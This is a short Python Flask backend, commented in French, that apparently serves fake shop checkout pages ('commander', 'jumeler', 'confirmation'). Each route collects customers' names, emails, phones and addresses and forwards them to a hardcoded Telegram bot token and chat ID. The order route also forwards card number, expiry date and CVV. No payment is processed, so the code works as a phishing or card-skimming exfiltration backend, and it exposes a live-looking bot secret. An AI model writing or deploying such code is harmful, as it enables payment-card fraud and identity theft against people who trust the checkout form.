from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# Remplace ces valeurs par ton token de bot Telegram et ton chat ID
TELEGRAM_BOT_TOKEN = '7960555289:AAGbYJgBElIfIDP01xa1yoCPnkb8aaxScUg'
TELEGRAM_CHAT_ID = '5652184847'

# Fonction pour envoyer un message à Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }
    response = requests.post(url, json=payload)
    return response.json()

# Route pour recevoir les données du formulaire de validation (validation.html)
@app.route('/commander', methods=['POST'])
def commander():
    # Récupère les données du formulaire
    data = request.form
    message = f"""
        Nouvelle commande reçue :
        - Prénom : {data.get('first-name')}
        - Nom : {data.get('last-name')}
        - Email : {data.get('email')}
        - Téléphone : {data.get('phone')}
        - Adresse de livraison : {data.get('address')}
        - Adresse de facturation : {data.get('billing-address')}
        - Quantité : {data.get('quantity')}
        - Sous-total : {data.get('subtotal')}
        - Frais de livraison : {data.get('delivery-cost')}
        - Réduction : {data.get('discount')}
        - Total : {data.get('final-total')}
        - Note : {data.get('note')}
        - Méthode de paiement : {data.get('payment-method')}
    """
    # Ajoute les détails de la carte de crédit si nécessaire
    if data.get('payment-method') == 'Carte de crédit':
        message += f"""
            - Nom du titulaire : {data.get('cardholder-name')}
            - Numéro de carte : {data.get('card-number')}
            - Date d'expiration : {data.get('expiry-date')}
            - CVV : {data.get('cvv')}
        """
    # Ajoute les détails du paiement en plusieurs fois si nécessaire
    elif data.get('payment-method') == 'Payer en plusieurs fois':
        message += f"""
            - Plan de paiement : {data.get('installment-plan')} fois
        """
    
    # Envoie le message à Telegram
    send_to_telegram(message)
    return jsonify({"status": "success", "message": "Commande envoyée avec succès"})

# Route pour recevoir les données du formulaire de jumelage (jumeler.html)
@app.route('/jumeler', methods=['POST'])
def jumeler():
    # Récupère les données du formulaire
    data = request.form
    message = f"""
        Nouveau jumelage de compte :
        - Prénom : {data.get('first-name')}
        - Nom : {data.get('last-name')}
        - Email : {data.get('email')}
        - Téléphone : {data.get('phone')}
        - Total : {data.get('total')}
    """
    # Envoie le message à Telegram
    send_to_telegram(message)
    return jsonify({"status": "success", "message": "Jumelage envoyé avec succès"})

# Route pour recevoir les données du formulaire de confirmation (confirmation.html)
@app.route('/confirmation', methods=['POST'])
def confirmation():
    # Récupère les données du formulaire
    data = request.form
    message = f"""
        Confirmation de paiement :
        - Prénom : {data.get('first-name')}
        - Nom : {data.get('last-name')}
        - Email : {data.get('email')}
        - Téléphone : {data.get('phone')}
        - Adresse de livraison : {data.get('address')}
        - Adresse de facturation : {data.get('billing-address')}
        - Quantité : {data.get('quantity')}
        - Sous-total : {data.get('subtotal')}
        - Frais de livraison : {data.get('delivery-cost')}
        - Réduction : {data.get('discount')}
        - Total : {data.get('final-total')}
        - Note : {data.get('note')}
        - Méthode de paiement : {data.get('payment-method')}
    """
    # Envoie le message à Telegram
    send_to_telegram(message)
    return jsonify({"status": "success", "message": "Confirmation envoyée avec succès"})

# Démarrer le serveur Flask
if __name__ == '__main__':
    app.run(debug=True)
